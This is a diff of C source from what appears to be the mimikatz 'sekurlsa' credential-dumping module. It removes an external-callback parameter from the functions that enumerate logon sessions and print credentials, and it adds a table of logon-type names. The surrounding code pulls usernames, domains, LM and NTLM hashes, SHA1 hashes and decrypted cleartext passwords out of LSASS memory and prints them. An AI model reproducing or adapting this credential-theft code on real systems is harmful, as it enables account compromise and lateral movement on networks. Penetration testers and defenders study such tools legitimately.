@@ -144,7 +144,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_range(PMEMORY_BASIC_INFORMATION pMemoryBasicI
 				{
 					donnees = (PUNICODE_STRING) pZone;
 					if(kull_m_string_suspectUnicodeStringStructure(&donnees[0]) && kull_m_string_suspectUnicodeStringStructure(&donnees[1]) && kull_m_string_suspectUnicodeStringStructure(&donnees[2]))
-						kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) donnees, NULL, KUHL_SEKURLSA_CREDS_DISPLAY_LINE | KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY | KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE, NULL, NULL);
+						kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) donnees, NULL, KUHL_SEKURLSA_CREDS_DISPLAY_LINE | KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY | KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE);
 				}
 			}
 			LocalFree(aBuffer.address);
@@ -155,7 +155,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_range(PMEMORY_BASIC_INFORMATION pMemoryBasicI
 
 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
 {
-	return kuhl_m_sekurlsa_getLogonData(lsassPackages, sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE), NULL, NULL);
+	return kuhl_m_sekurlsa_getLogonData(lsassPackages, sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE));
 }
 
 NTSTATUS kuhl_m_sekurlsa_strings(int argc, wchar_t * argv[])
@@ -363,7 +363,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
 			{
 				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
-				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData, pLsassData->externalCallback, pLsassData->externalCallbackData);
+				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
 				kprintf(L"\n");
 			}
 		}
@@ -371,6 +371,22 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 	return TRUE;
 }
 
+const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
+	L"UndefinedLogonType",
+	L"Unknown !",
+	L"Interactive",
+	L"Network",
+	L"Batch",
+	L"Service",
+	L"Proxy",
+	L"Unlock",
+	L"NetworkCleartext",
+	L"NewCredentials",
+	L"RemoteInteractive",
+	L"CachedInteractive",
+	L"CachedRemoteInteractive",
+	L"CachedUnlock",
+};
 void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
 	kprintf(L"\nAuthentication Id : %u ; %u (%08x:%08x)\n"
@@ -385,13 +401,13 @@ void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_
 	kprintf(L"\n");
 }
 
-NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages)
 {
-	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages, externalCallback, externalCallbackData};
+	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
 }
 
-VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
 {
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
@@ -417,13 +433,10 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
-					if(externalCallback)
-						externalCallback(luid, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName, NULL, pPrimaryCreds->LmOwfPassword, pPrimaryCreds->NtOwfPassword, externalCallbackData);
 
 					kprintf(L"\n\t * Username : %wZ"
 						L"\n\t * Domain   : %wZ"
 						, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
-
 					kprintf(L"\n\t * LM       : "); kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 					kprintf(L"\n\t * NTLM     : "); kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 					kprintf(L"\n\t * SHA1     : "); kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
@@ -477,9 +490,6 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
 					password = &mesCreds->Password;
 				}
-
-				if(externalCallback)
-					externalCallback(luid, username, domain, password, NULL, NULL, externalCallbackData);
 
 				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
 				{
